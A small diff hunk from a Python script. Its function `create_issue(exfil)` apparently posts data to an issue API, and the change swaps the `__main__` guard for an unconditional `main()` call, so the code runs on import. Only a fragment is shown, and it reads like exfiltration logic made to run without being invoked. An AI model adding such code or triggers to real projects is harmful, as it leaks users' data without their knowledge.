@@ -56,5 +56,4 @@ def create_issue(exfil):
 
     urllib.request.Request(api_url, data=data, headers=headers, method="POST")
 
-if __name__ == "__main__":
-    main()
+main()
